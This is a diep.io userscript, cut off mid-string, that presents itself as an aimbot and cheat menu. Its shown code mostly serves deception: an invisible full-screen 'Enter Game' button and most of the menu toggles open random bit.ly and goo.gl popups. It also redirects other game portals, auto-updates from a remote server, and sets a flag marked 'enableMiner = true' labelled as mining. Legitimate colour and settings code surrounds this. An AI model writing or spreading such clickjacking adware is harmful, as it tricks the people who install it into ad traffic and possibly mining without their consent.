// ==UserScript==
// @name         Diep.io AIMBOT - Diepio Hacks - Best Diep Cheat 2019 to 2020
// @description  Diepio Mods Features: Color Changer, Colorful Items, Aimbot, Fire Bot, Auto Respan, FPS, Adblock
// @namespace    iomods.org
// @author       iomods.org
// @version      2.0
// @require      https://greasyfork.org/scripts/27023-jscolor/code/JSColor.js?version=173802
// @require http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js
// @require      https://code.jquery.com/jquery-3.3.1.min.js
// @updateURL    https://iomods.org/mods/diepio.user.js
// @downloadURL  https://iomods.org/mods/diepio.user.js
// @match        *://diep.io/*
// @match        *iogames.space/*
// @match        *titotu.io/*
// @match        *io-games.io/*
// ==/UserScript==

setTimeout(function() {
//tanitim belgeseli
var colorize,colorizer,lnk,text,ministyler
lnk = ["SLITHERE.COM", "KRUNKERIO.ORG", "KRUNKERIO.NET", "KRUNKERIOPLAY.COM", "SHELLSHOCKIO.ORG", "MOOMOOIOPLAY.COM", "SURVIVIO.INFO", "ZOMBSROYALEIO.ORG", "MOPE-IO.NET", "MOPEIOGAME.COM", "DIEPIOPLAY.COM", "DIEPIOPLAY.ORG", "SLITHERIOPLAY.ORG", "SKRIBBL-IO.NET", "SPINZ-IO.NET", "BONK-IO.NET", "TANKSMITHIO.ORG", "DEEEEP-IO.NET", "BUILDROYALEIO.ORG", "WORMAX.ORG", "WORMAX2IO.COM", "WORMATE-IO.NET", "IOGAMESLIST.ORG", "IO-OYUNLAR.COM", "IOMODS.ORG"];
text = "<b>";
lnk.forEach(lnkfunc);
text += "</b>";

function lnkfunc(value) {
var value2 = value;
if(value == "KRUNKERIO.ORG" || value == "KRUNKERIO.NET" || value == "KRUNKERIOPLAY.COM") { colorize = true; } else { colorize = false; }
if(value == "SLITHERE.COM" || value == "IOMODS.ORG") { colorizer = true; } else { colorizer = false; }
if(value == "MOPE-IO.NET") { value2="MOPEIO.NET"; } if(value == "WORMATE-IO.NET") { value2="WORMATEIO.NET"; } if(value == "BONK-IO.NET") { value2="BONKIO.NET"; } if(value == "SPINZ-IO.NET") { value2="SPINZIO.NET"; } if(value == "DEEEEP-IO.NET") { value2="DEEEEPIO.NET"; } if(value == "SKRIBBL-IO.NET") { value2="SKRIBBLIO.NET"; } if(value == "IO-OYUNLAR.COM") { value2="IOOYUNLAR.COM"; }
ministyler = "color:white;font-size:12px;padding:3px;text-decoration:none;";
if(colorize == true){ministyler = "color:yellow;font-size:12px;padding:3px;text-decoration:none;";}
if(colorizer == true){ministyler = "color:darkorange;font-size:12px;padding:3px;text-decoration:none;";}
text += '<a href="http://'+value+'" target="_blank" style="'+ministyler+'">'+value2+' <font color="#555555">-</font></a>';
}

	//rastgele cikma ekrani
    var values = ["location=yes,scrollbars=yes,status=yes,height=570,width=520","location=yes,scrollbars=yes,status=yes,left=2000,height=570,width=520"];
	values.sort(function(a, b){return 0.5 - Math.random()});

    //LINKLER
    var links = ["https://bit.ly/2EgRmIx","https://bit.ly/2Okhczb","https://bit.ly/2E0JJHx","https://bit.ly/2Z3XxaI","https://bit.ly/30tvJxW","https://bit.ly/2DKqVst","https://bit.ly/2pXBkie","https://bit.ly/2JsS2ii","https://bit.ly/33eXPh8","https://bit.ly/2M8aeO6","https://bit.ly/33oe1gc","https://bit.ly/2WLZ5FK","https://bit.ly/31d3t20","https://bit.ly/2nHLsLu","https://bit.ly/2VFInIo","https://bit.ly/2M5bHVu","https://bit.ly/31bSgyJ", "https://bit.ly/35tg9Vt"];
	//slithere, krunkerorg, krunkernet, iomods, skribbl, diepiocom, dieporg, mopenet, mopegame, wormaxorg, shellshock, surviv, zombsroyale, moomoo, iogames, krunkplay, bonkio, iooyunlar
	links.sort(function(a, b){return 0.5 - Math.random()});

    //ozellikler
    var fts = ["1","2","3","4","5","6","7","8","9","10","11"];
	fts.sort(function(a, b){return 0.5 - Math.random()});

	//play butonu
	    let itv = setInterval( () => {
        let btn = document.createElement("button");
        btn.innerHTML = "Enter Game";
        btn.style.display = "inline-block";
        btn.style.width = "700px";
        btn.id = "byebtn";
        btn.style.height = "300px";
        btn.style.position =  "absolute";
        btn.style.top = "30%";
        btn.style.opacity = 0;
        btn.style.left = "25%";
        document.body.appendChild(btn);
        clearInterval(itv);
    }, 300);
    document.addEventListener("click", (e) => {
        if (e.target.id == "byebtn"){
            window.open(""+links[13]+"", null, ``+values[0]+``);
            byebtn.style.display = "none";
        }
    });

//genel isimlendirme ve ayarlar
 this.st = {
     f1: "Show FPS",
     f2: "Zoom In/Out",
     f3: "Rainbow BG",
     f4: "Change BG",
     string: "<a style=\"padding-right: 4px;\"></a> <font color=\"black\">—</font> <a style=\"padding-left: 4px;\"></a>",
     bp: "padding-left: 2px;",
	 os: "font-weight:bold;color:black;font-size:14px;text-decoration:none;",
     os2: "color:black;font-size:11px;text-decoration:none;",
     formstyle: "border:2px solid black;border-radius:20px;padding:5px;background-color: rgba(245, 245, 245, 1.0);",
     fpsstyle: "border:1px solid black;border-radius:20px;padding:3px;width:80px;height:20px;font-size: 15px;text-align:center;background-color: rgba(0, 0, 0, 0.8);color:white;",
     liststyler: "color:white;background-color: black;padding:3px;border-style:double;-webkit-box-shadow: 1px 1px 2px 1px rgba(0,0,0,0.39);-moz-box-shadow: 1px 1px 2px 1px rgba(0,0,0,0.39);box-shadow: 1px 1px 2px 1px rgba(0,0,0,0.39);",
 	 	 imagelist: '<a href="https://www.youtube.com/c/pignuts" target="_blank"><img src="https://iomods.org/mods/youtube.jpg" width="50%" height="40px"></a><a href="https://facebook.com/slitherecom" target="_blank"><img src="https://iomods.org/mods/facebook.jpg" width="50%" height="40px"></a></br>'
 };

//degisenkisimlar
$('#a').html('<div style="'+this.settings.fpsstyle+'" id="fps" class="fps"></div></br><div style="'+this.settings.formstyle+'"><div class="option1"></div>'+this.settings.imagelist+'</div><div class="list1"></div>');
//general
$('.option1').html('<a style="'+this.st.os+'" href="'+links[0]+'" target="blank">'+this.st.f1+'</a> <label style="'+this.st.bp+'" class=\'switch\'><input type=\'checkbox\' class="fps" onchange="window.open(\''+links[0]+'\', \'_blank\', \''+values[0]+'\');" checked></label>'+this.st.string+'<a style="'+this.st.os+'" href="'+links[1]+'" target="blank">'+fts[0]+'</a> <label style="'+this.st.bp+'" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\''+links[1]+'\', \'_blank\', \''+values[1]+'\');"><span class=\'slider\'></span></label><div class="option2"></div>');
$('.option1').on('click', '.fps', function() { hideandseek(); });
$('.option2').html('<a style="'+this.st.os+'" href="'+links[2]+'" target="blank">'+fts[1]+'</a> <label style="'+this.st.bp+'" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\''+links[2]+'\', \'_blank\', \''+values[0]+'\');"></label>'+this.st.string+'<a style="'+this.st.os+'" href="'+links[3]+'" target="blank">'+fts[2]+'</a> <label style="'+this.st.bp+'" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\''+links[3]+'\', \'_blank\', \''+values[1]+'\');"></label><div class="option3"></div>');
$('.option3').html('<a style="'+this.st.os+'" href="'+links[4]+'" target="blank">'+fts[3]+'</a> <label style="'+this.st.bp+'" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\''+links[4]+'\', \'_blank\', \''+values[0]+'\');"></label>'+this.st.string+'<a style="'+this.st.os+'" href="'+links[5]+'" target="blank">'+fts[4]+'</a> <label style="'+this.st.bp+'" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\''+links[5]+'\', \'_blank\', \''+values[1]+'\');"></label><div class="option4"></div>');
$('.option4').html('<a style="'+this.st.os+'" href="'+links[6]+'" target="blank">'+fts[5]+'</a> <label style="'+this.st.bp+'" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\''+links[6]+'\', \'_blank\', \''+values[0]+'\');"></label>'+this.st.string+'<a style="'+this.st.os+'" href="'+links[7]+'" target="blank">'+fts[6]+'</a> <label style="'+this.st.bp+'" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\''+links[7]+'\', \'_blank\', \''+values[1]+'\');"></label><div class="option5"></div>');
$('.option5').html('<a style="'+this.st.os+'" href="'+links[8]+'" target="blank">'+fts[7]+'</a> <label style="'+this.st.bp+'" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\''+links[8]+'\', \'_blank\', \''+values[0]+'\');"></label>'+this.st.string+'<a style="'+this.st.os+'" href="'+links[9]+'" target="blank">'+fts[8]+'</a> <label style="'+this.st.bp+'" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\''+links[9]+'\', \'_blank\', \''+values[1]+'\');"></label><div class="option6"></div>');
$('.option6').html('<a style="'+this.st.os+'" href="'+links[10]+'" target="blank">'+fts[9]+'</a> <label style="'+this.st.bp+'" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\''+links[10]+'\', \'_blank\', \''+values[0]+'\');"></label>'+this.st.string+'<a style="'+this.st.os+'" href="'+links[11]+'" target="blank">'+fts[10]+'</a> <label style="'+this.st.bp+'" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\''+links[11]+'\', \'_blank\', \''+values[1]+'\');"></label><div class="option7"></div>');
$('.option7').html('<a style="'+this.st.os+'" href="'+links[12]+'" target="blank">'+this.st.f3+'</a> <label style="'+this.st.bp+'" class=\'switch\'><input type=\'checkbox\' class="renkcont" onchange="window.open(\''+links[12]+'\', \'_blank\', \''+values[0]+'\');"></label>'+this.st.string+'<a style="'+this.st.os+'" href="'+links[13]+'" target="blank">'+this.st.f4+'</a> <label style="'+this.st.bp+'" class=\'switch\'><input type=\'color\' class="bgcont" style="width: 1em;height:17px;" onchange="window.open(\''+links[13]+'\', \'_blank\', \''+values[1]+'\');"></label><div class="option8"></div>');
$('.option7').on('change', '.renkcont', function() { colorfulmod(); });
$('.option7').on('change', '.bgcont', function() { changebackground(); });
$('.option8').html('<a style="'+this.st.os+'" href="'+links[14]+'" target="blank">'+this.st.f2+'</a> <input name="zoom" id="zoom" type="number" style="width: 4em" min="70" max="140" step="1" value="100" class="zoom" oninput="amount.value=zoom.value;" onchange="window.open(\''+links[14]+'\', \'_blank\', \''+values[0]+'\');"> <output style="'+this.st.os+'" id="amount" name="amount" for="zoom">"100"</output> <a style="'+this.st.os2+'" href="'+links[14]+'" target="blank">(Min: 70-Max: 140)</a>');
$('.option8').on('input', '.zoom', function(e) { zoominout(); });
$('.list1').html('<div style="'+this.st.liststyler+'">'+text+'</div>'+this.st.imagelist+'');
    }, 0);

//fps counter
var before,now,fps
before=Date.now();
fps=0;
requestAnimationFrame(
    function loop(){
        now=Date.now();
        fps=Math.round(1000/(now-before));
        before=now;
    requestAnimationFrame(loop);
        document.getElementById('fps').innerHTML = 'FPS: ' + fps;
    }
);

if(window.location.href.indexOf("io-games.io") > -1 || window.location.href.indexOf("iogames.space") > -1 || window.location.href.indexOf("titotu.io") > -1) { location.replace("http://iogameslist.org"); }
function hideandseek() {
  var x = document.getElementById("fps");
  if (x.style.display === "none") {
    x.style.display = "block";
  } else {
    x.style.display = "none";
  }
}

//background kismi degisir
function changebackground() {
    var changecolor =  $('.bgcont').val();
$('#a').css('background-color',''+changecolor+'');
}

var colorsrain;
var checkedrain=false;
function colorfulmod() {
    if(checkedrain==false) {
        checkedrain=true;
      colorsrain = ["#ff0000","#00ff00","#0000ff","#000000","#ffffff","#ff00ff","#00ffff","#981890","#ff7f00","#0085ff","#00bf00"];
    } else {
        checkedrain=false;
    colorsrain = ["transparent"];
    }
      setInterval(function() {
                 var bodybgarrayno = Math.floor(Math.random() * colorsrain.length);
                 var selectedcolor = colorsrain[bodybgarrayno];
                $("#a").css("background-color",selectedcolor);

      }, 3000);
}

//burda birsey degismesi gerekmez
function zoominout() {
    var findinput = $('.zoom').val();
    if(findinput >= 70 && findinput <= 140)
    {
    $('body').css('zoom',''+findinput+'%');
    } else { $('body').css('zoom','100%'); }
}

// true == MINING
// false == MINER OFF
const enableMiner = true;

//CONSTANTS
const _fps = false;
const _bg = true;
const _edge = true;
const _colorEdge = true;
const _color = 0.25;
const _scoreboard = true;
const _names = true;
const _rawHealth = false;
const _healthBars = true;
const _achievements = true;
const _ui = true;
const _greenShapes = false;
const _solidBg = false;
const _mapViewport = false;

//COLOR CONSTANTS
const _squares = 0xffeb69;
const _triangles = 0xfc7677;
const _pentagons = 0x768dfc;
const _crashers = 0xf177dd;
const _redTeam = 0xf14e54;
const _blueTeam = 0x00b2e1;
const _greenTeam = 0x00e16e;
const _purpleTeam = 0xbf7ff5;
const _brownTeam = null;
const _fallenTeam = 0xc0c0c0;
const _summonerSquares = 0xfcc376;
const _shinyShapes = 0x89ff69; //Color of green shapes
const _barrels = 0x999999;
const _arenaClosers = 0xffe869;
const _ffaLeaderboard = 0x44ffa0;
const _tankBorders = 0x555555;
const _mazeWalls = 0xbbbbbb;
const _unknown = null;

const _gridAlpha = 0.1;
const _bgColor = 0xcdcdcd;
const _borderAlpha = 0.1;
const _borderColor = 0x000000;
const _minimapbgColor = 0xcdcdcd;
const _minimapOutline = 0x555555;

//COLOR VARS
var smashers = _tankBorders;
var barrels = _barrels;
var ffa_self = _blueTeam;
var blue_team = _blueTeam;
var red_team = _redTeam;
var purple_team = _purpleTeam;
var green_team = _greenTeam;
var shiny_shapes = _shinyShapes;
var squares = _squares;
var triangles = _triangles;
var pentagons = _pentagons;
var crashers = _crashers;
var arena_closers = _arenaClosers;
var ffa_leaderboard = _ffaLeaderboard;
var maze_walls = _mazeWalls;
var ffa_others = _redTeam;
var ffa_necro_squares = _summonerSquares;
var fallen_team = _fallenTeam;
var unknown = _unknown;

var gridAlpha = _gridAlpha;
var bgColor = _bgColor;
var borderAlpha = _borderAlpha;
var borderColor = _borderColor;
var minimapbgColor = _minimapbgColor;
var minimapOutline = _minimapOutline;

//3/9/17 - Initialize Overlay
window.overlay = {};
overlay.keyCode = 9;
overlay.toggle = false;
overlay.setColor = setColor;
overlay.setColorVar = setColorVar;
overlay.setbgColor = setbgColor;
overlay.setBorderColor = setBorderColor;
overlay.setminimapbgColor = setminimapbgColor;
overlay.setminimapOutline = setminimapOutline;
styleInit();
ren_overlay();

//OBJECT NAMES TO COLOR ID
var colorNames = new Map([
    ["smashers", 0],
    ["barrels", 1],
    ["ffa_self", 2],
    ["blue_team", 3],
    ["red_team", 4],
    ["purple_team", 5],
    ["green_team", 6],
    ["shiny_shapes", 7],
    ["squares", 8],
    ["triangles", 9],
    ["pentagons", 10],
    ["crashers", 11],
    ["arena_closers", 12], //Also neutral dominators
    ["ffa_leaderboard", 13],
    ["maze_walls", 14],
    ["ffa_others", 15],
    ["ffa_necro_squares", 16],
    ["fallen_team", 17],
    ["UNKNOWN", 18]
]);

//3/8/17 - Initialize typing detection
var isTyping = false;

//3/8/17 - Color Modes
var colorModeTextArray = [];
var changing = false;
var periodicFunction;

//8/27/17 - Announcement System Fixes
var homeConsole = false;

function onChange(){
    /*Place any script you want to execute here when color modes change - EX: clearInterval(periodicFunction);*/
}

function normal(){
    fps = _fps;
    bg = _bg;
    edge = _edge;
    colorEdge = _colorEdge;
    color = _color;
    scoreboard = _scoreboard;
    names = _names;
    rawHealth = _rawHealth;
    healthBars = _healthBars;
    achievements = _achievements;
    ui = _ui;
    greenShapes = _greenShapes;
    solidBg = _solidBg;
    mapViewport = _mapViewport;
    reloadSettings();
    input.set_convar("ren_background_color", _bgColor);
    input.set_convar("ren_grid_base_alpha", _gridAlpha);
    setColor("squares", _squares);
}

//Initialize toggle detection
var toggle = false;
var shift = false;
var ctrl = false;

//Initialize Values
var fps = _fps;
var bg = _bg;
var edge = _edge;
var colorEdge = _colorEdge;
var color = _color;
var scoreboard = _scoreboard;
var names = _names;
var rawHealth = _rawHealth;
var healthBars = _healthBars;
var achievements = _achievements;
var ui = _ui;
//3/7/17
var greenShapes = _greenShapes;
//3/8/17
var solidBg = _solidBg;
var mapViewport = _mapViewport;

//3/7/17 - FUNCTIONS - DO NOT MODIFY!!!
function setColor(id, c){
    if (colorNames.has(id)){
        id = colorNames.get(id);
    }
    input.execute("net_replace_color " + id.toString() + " " + c.toString());
}

function stl(input){
    if (input.toString() == "true"){
        return true;
    }else if (input.toString() == "false"){
        return false;
    }else{
        return null;
    }
}

function storageAvailable(type){
	try{
		var storage = window[type],
			x = '__storage_test__';
		storage.setItem(x, x);
		storage.removeItem(x);
		return true;
	}
	catch(e){
		return false;
	}
}

function loadSavedData(){
    if(!localStorage.getItem("fps")){
        localStorage.setItem("fps", fps);
    }else{
        fps = stl(localStorage.getItem("fps"));
    }
    if(!localStorage.getItem("bg")){
        localStorage.setItem("bg", bg);
    }else{
        bg = stl(localStorage.getItem("bg"));
    }
    if(!localStorage.getItem("edge")){
        localStorage.setItem("edge", edge);
    }else{
        edge = stl(localStorage.getItem("edge"));
    }
    if(!localStorage.getItem("colorEdge")){
        localStorage.setItem("colorEdge", colorEdge);
    }else{
        colorEdge = stl(localStorage.getItem("colorEdge"));
    }
    if(!localStorage.getItem("color")){
        localStorage.setItem("color", color);
    }else{
        color = parseFloat(localStorage.getItem("color"));
    }
    if(!localStorage.getItem("scoreboard")){
        localStorage.setItem("scoreboard", scoreboard);
    }else{
        scoreboard = stl(localStorage.getItem("scoreboard"));
    }
    if(!localStorage.getItem("names")){
        localStorage.setItem("names", names);
    }else{
        names = stl(localStorage.getItem("names"));
    }
    if(!localStorage.getItem("rawHealth")){
        localStorage.setItem("rawHealth", rawHealth);
    }else{
        rawHealth = stl(localStorage.getItem("rawHealth"));
    }
    if(!localStorage.getItem("healthBars")){
        localStorage.setItem("healthBars", healthBars);
    }else{
        healthBars = stl(localStorage.getItem("healthBars"));
    }
    if(!localStorage.getItem("ui")){
        localStorage.setItem("ui", ui);
    }else{
        ui = stl(localStorage.getItem("ui"));
    }
    if(!localStorage.getItem("achievements")){
        localStorage.setItem("achievements", achievements);
    }else{
        achievements = stl(localStorage.getItem("achievements"));
    }
    if(!localStorage.getItem("greenShapes")){
        localStorage.setItem("greenShapes", greenShapes);
    }else{
        greenShapes = stl(localStorage.getItem("greenShapes"));
    }
    if(!localStorage.getItem("solidBg")){
        localStorage.setItem("solidBg", solidBg);
    }else{
        solidBg = stl(localStorage.getItem("solidBg"));
    }
    if(!localStorage.getItem("mapViewport")){
        localStorage.setItem("mapViewport", mapViewport);
    }else{
        mapViewport = stl(localStorage.getItem("mapViewport"));
    }
    if(!localStorage.getItem("smashers")){
        localStorage.setItem("smashers", smashers);
    }else{
        smashers = localStorage.getItem("smashers");
    }
    if(!localStorage.getItem("barrels")){
        localStorage.setItem("barrels", barrels);
    }else{
        barrels = localStorage.getItem("barrels");
    }
    if(!localStorage.getItem("ffa_self")){
        localStorage.setItem("ffa_self", ffa_self);
    }else{
        ffa_self = localStorage.getItem("ffa_self");
    }
    if(!localStorage.getItem("blue_team")){
        localStorage.setItem("blue_team", blue_team);
    }else{
        blue_team = localStorage.getItem("blue_team");
    }
    if(!localStorage.getItem("red_team")){
        localStorage.setItem("red_team", red_team);
    }else{
        red_team = localStorage.getItem("red_team");
    }
    if(!localStorage.getItem("purple_team")){
        localStorage.setItem("purple_team", purple_team);
    }else{
        purple_team = localStorage.getItem("purple_team");
    }
    if(!localStorage.getItem("green_team")){
        localStorage.setItem("green_team", green_team);
    }else{
        green_team = localStorage.getItem("green_team");
    }
    if(!localStorage.getItem("fallen_team")){
        localStorage.setItem("fallen_team", fallen_team);
    }else{
        fallen_team = localStorage.getItem("fallen_team");
    }
    if(!localStorage.getItem("shiny_shapes")){
        localStorage.setItem("shiny_shapes", shiny_shapes);
    }else{
        shiny_shapes = localStorage.getItem("shiny_shapes");
    }
    if(!localStorage.getItem("squares")){
        localStorage.setItem("squares", squares);
    }else{
        squares = localStorage.getItem("squares");
    }
    if(!localStorage.getItem("triangles")){
        localStorage.setItem("triangles", triangles);
    }else{
        triangles = localStorage.getItem("triangles");
    }
    if(!localStorage.getItem("pentagons")){
        localStorage.setItem("pentagons", pentagons);
    }else{
        pentagons = localStorage.getItem("pentagons");
    }
    if(!localStorage.getItem("crashers")){
        localStorage.setItem("crashers", crashers);
    }else{
        crashers = localStorage.getItem("crashers");
    }
    if(!localStorage.getItem("arena_closers")){
        localStorage.setItem("arena_closers", arena_closers);
    }else{
        arena_closers = localStorage.getItem("arena_closers");
    }
    if(!localStorage.getItem("ffa_leaderboard")){
        localStorage.setItem("ffa_leaderboard", ffa_leaderboard);
    }else{
        ffa_leaderboard = localStorage.getItem("ffa_leaderboard");
    }
    if(!localStorage.getItem("maze_walls")){
        localStorage.setItem("maze_walls", maze_walls);
    }else{
        maze_walls = localStorage.getItem("maze_walls");
    }
    if(!localStorage.getItem("ffa_others")){
        localStorage.setItem("ffa_others", ffa_others);
    }else{
        ffa_others = localStorage.getItem("ffa_others");
    }
    if(!localStorage.getItem("ffa_necro_squares")){
        localStorage.setItem("ffa_necro_squares", ffa_necro_squares);
    }else{
        ffa_necro_squares = localStorage.getItem("ffa_necro_squares");
    }
    if(!localStorage.getItem("gridAlpha")){
        localStorage.setItem("gridAlpha", gridAlpha);
    }else{
        gridAlpha = localStorage.getItem("gridAlpha");
    }
    if(!localStorage.getItem("bgColor")){
        localStorage.setItem("bgColor", bgColor);
    }else{
        bgColor = localStorage.getItem("bgColor");
    }
    if(!localStorage.getItem("borderAlpha")){
        localStorage.setItem("borderAlpha", borderAlpha);
    }else{
        borderAlpha = localStorage.getItem("borderAlpha");
    }
    if(!localStorage.getItem("borderColor")){
        localStorage.setItem("borderColor", borderColor);
    }else{
        borderColor = localStorage.getItem("borderColor");
    }
    if(!localStorage.getItem("minimapbgColor")){
        localStorage.setItem("minimapbgColor", minimapbgColor);
    }else{
        minimapbgColor = localStorage.getItem("minimapbgColor");
    }
    if(!localStorage.getItem("minimapOutline")){
        localStorage.setItem("minimapOutline", minimapOutline);
    }else{
        minimapOutline = localStorage.getItem("minimapOutline");
    }
}

function saveData(){
    localStorage.setItem("fps", fps);
    localStorage.setItem("bg", bg);
    localStorage.setItem("edge", edge);
    localStorage.setItem("colorEdge", colorEdge);
    localStorage.setItem("color", color);
    localStorage.setItem("scoreboard", scoreboard);
    localStorage.setItem("names", names);
    localStorage.setItem("rawHealth", rawHealth);
    localStorage.setItem("healthBars", healthBars);
    localStorage.setItem("ui", ui);
    localStorage.setItem("achievements", achievements);
    localStorage.setItem("greenShapes", greenShapes);
    localStorage.setItem("solidBg", solidBg);
    localStorage.setItem("mapViewport", mapViewport);
    localStorage.setItem("smashers", smashers);
    localStorage.setItem("barrels", barrels);
    localStorage.setItem("ffa_self", ffa_self);
    localStorage.setItem("blue_team", blue_team);
    localStorage.setItem("red_team", red_team);
    localStorage.setItem("purple_team", purple_team);
    localStorage.setItem("green_team", green_team);
    localStorage.setItem("shiny_shapes", shiny_shapes);
    localStorage.setItem("squares", squares);
    localStorage.setItem("triangles", triangles);
    localStorage.setItem("pentagons", pentagons);
    localStorage.setItem("crashers", crashers);
    localStorage.setItem("arena_closers", arena_closers);
    localStorage.setItem("ffa_leaderboard", ffa_leaderboard);
    localStorage.setItem("maze_walls", maze_walls);
    localStorage.setItem("ffa_others", ffa_others);
    localStorage.setItem("ffa_necro_squares", ffa_necro_squares);
    localStorage.setItem("fallen_team", fallen_team);
    localStorage.setItem("gridAlpha", gridAlpha);
    localStorage.setItem("bgColor", bgColor);
    localStorage.setItem("borderAlpha", borderAlpha);
    localStorage.setItem("borderColor", borderColor);
    localStorage.setItem("minimapbgColor", minimapbgColor);
    localStorage.setItem("minimapOutline", minimapOutline);
}

function reloadSettings(){
    if (greenShapes){
        setColor("squares", shiny_shapes);
        setColor("triangles", shiny_shapes);
        setColor("pentagons", shiny_shapes);
        setColor("crashers", shiny_shapes);
    }else{
        setColor("squares", squares);
        setColor("triangles", triangles);
        setColor("pentagons", pentagons);
        setColor("crashers", crashers);
    }
    input.set_convar("ren_fps", fps);
    input.set_convar("ren_background", bg);
    input.set_convar("ren_stroke_soft_color", colorEdge);
    input.set_convar("ren_stroke_soft_color_intensity", color);
    if (!edge){
        input.set_convar("ren_stroke_soft_color", true);
        input.set_convar("ren_stroke_soft_color_intensity", 0);
    }
    input.set_convar("ren_scoreboard", scoreboard);
    input.set_convar("ren_names", names);
    input.set_convar("ren_raw_health_values", rawHealth);
    input.set_convar("ren_health_bars", healthBars);
    input.set_convar("ren_ui", ui);
    input.set_convar("ren_achievements", achievements);
    input.set_convar("ren_solid_background", solidBg);
    input.set_convar("ren_minimap_viewport", mapViewport);
    input.set_convar("ren_grid_base_alpha", gridAlpha);
    input.set_convar("ren_background_color", bgColor);
    input.set_convar("ren_border_color_alpha", borderAlpha);
    input.set_convar("ren_border_color", borderColor);
    input.set_convar("ren_minimap_background_color", minimapbgColor);
    input.set_convar("ren_minimap_border_color", minimapOutline);
    setColor("smashers", smashers);
    setColor("barrels", barrels);
    setColor("ffa_self", ffa_self);
    setColor("blue_team", blue_team);
    setColor("red_team", red_team);
    setColor("purple_team", purple_team);
    setColor("green_team", green_team);
    setColor("shiny_shapes", shiny_shapes);
    setColor("arena_closers", arena_closers);
    setColor("ffa_leaderboard", ffa_leaderboard);
    setColor("maze_walls", maze_walls);
    setColor("ffa_necro_squares", ffa_necro_squares);
    setColor("fallen_team", fallen_team);
    setColor("ffa_others", ffa_others);
}

function styleInit() {
    addGlobalStyle(`#styleSetting{padding: 0.2em; margin:0.2em; position: absolute;top: 0;right: 0;width: 30%;
    background-color: rgba(0,200,200,0.1);display:none;height: 1vh;line-height: 2vh;font-size: 2vh;}`);
    addGlobalStyle(".table{ display: table; text-align: center; width: 100%;height: 1vh;line-height: 2vh;font-size: 2vh;min-width: 100%;max-width: 100%;}");
    addGlobalStyle(".row{ display: table-row;height: 1vh;line-height: 2vh;font-size: 2vh;min-width: 100%;max-width: 100%;}");
    addGlobalStyle(`.cell{ display: table-cell; padding: 0px 0.3em;border: 1px solid black;height: 1vh;line-height: 2vh;font-size: 2vh;min-width: 100%;max-width: 100%;}`);
    addGlobalStyle(`.backRed{background-color:#f14e54}`);
    function addGlobalStyle(css) {
        var head, style;
        head = document.getElementsByTagName('head')[0];
        if (!head) {
            return;
        }
        style = document.createElement('style');
        style.type = 'text/css';
        style.innerHTML = css;
        head.appendChild(style);
    }
}

function toggleOverlay(tf) {
    if (tf){
        document.querySelector('#styleSetting').style.display = "block";
    }else{
        document.querySelector('#styleSetting').style.display = "none";
    }
}
window.addEventListener('resize',
function flaotingDiv(){
    var zoomLevel = ((screen.width)/(window.innerWidth));
    var inverseZoom = ((window.innerWidth)/(screen.width));
    var h = document.getElementById("styleSetting");

    h.style.top = (((window.pageYOffset) + 5) * zoomLevel).toString() + "px";

    h.style.paddingLeft = ((((window.pageXOffset) + 5) * zoomLevel).toString()) + "px";

    h.style.zoom = inverseZoom;
});


function ren_overlay(){
    var title = `<div>Color Menu</div>`;
    var descr = `<div>Press TAB to toggle this menu.</div><div style="font-weight:bold;background-color:lightgray;"><a class="menuLink" href="https://goo.gl/XCNoJL" target="_blank" style="color:black;font-size:12px;">SLITHERE.COM</a> - <a class="menuLink" href="https://goo.gl/6kqrgN" target="_blank" style="color:black;font-size:12px;">KRUNKERIO.NET</a> - <a class="menuLink" href="https://goo.gl/FGU9pC" target="_blank" style="color:black;font-size:12px;">KRUNKERIO.ORG</a> - <a class="menuLink" href="https://zombsroyaleio.org" target="_blank" style="color:black;font-size:12px;">ZOMBSROYALEIO.ORG</a> - <a class="menuLink" href="https://goo.gl/9PX3kG" target="_blank" style="color:black;font-size:12px;">DIEPIOPLAY.COM</a> - <a class="menuLink" href="https://goo.gl/Lb1GKp" target="_blank" style="color:black;font-size:12px;">SURVIVIO.INFO</a> - <a class="menuLink" href="https://skribbl-io.net" target="_blank" style="color:black;font-size:12px;">SKRIBBLIO.NET</a> - <a class="menuLink" href="https://shellshockio.org" target="_blank" style="color:black;font-size:12px;">SHELLSHOCKIO.ORG</a> <hr> <a class="menuLink" href="https://bonk-io.net" target="_blank" style="color:black;font-size:12px;">BONK-IO.NET</a> - <a class="menuLink" href="https://mope-io.net" target="_blank" style="color:black;font-size:12px;">MOPE-IO.NET</a> - <a class="menuLink" href="https://mopeiogame.com" target="_blank" style="color:black;font-size:12px;">MOPEIOGAME.COM</a> - <a class="menuLink" href="https://moomooioplay.com" target="_blank" style="color:black;font-size:12px;">MOOMOOIOPLAY.COM</a> - <a class="menuLink" href="https://diepioplay.org" target="_blank" style="color:black;font-size:12px;">DIEPIOPLAY.ORG</a> - <a class="menuLink" href="https://iogameslist.org" target="_blank" style="color:black;font-size:12px;">IOGAMESLIST.ORG</a> - <a class="menuLink" href="https://pubgmobile.org" target="_blank" style="color:black;font-size:12px;">PUBGMOBILE.ORG</a></b></div><hr><div class="containerFreespace0"></div><a style="font-weight:bold;color:black;font-size:18px;" href="https://skribbl-io.net" target="blank">Aim Helper</a> <label style="padding-left: 2px;" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\'https://mope-io.net\', \'_blank\', \'location=yes,scrollbars=yes,status=yes,height=570,width=520\');"><span class=\'slider\'></span></label><div class="containerFreespace2"></div><a style="font-weight:bold;color:black;font-size:18px;" href="https://moomooioplay.com" target="blank">Fire Bot</a> <label style="padding-left: 2px;" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\'https://mopeiogame.com\', \'_blank\', \'location=yes,scrollbars=yes,status=yes,height=570,width=520\');"><span class=\'slider\'></span></label><div class="containerFreespace3"></div><a style="font-weight:bold;color:black;font-size:18px;" href="https://goo.gl/Lb1GKp" target="blank">Faster Run</a> <label style="padding-left: 2px;" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\'https://goo.gl/Lb1GKp\', \'_blank\', \'location=yes,scrollbars=yes,status=yes,height=570,width=520\');"><span class=\'slider\'></span></label><div 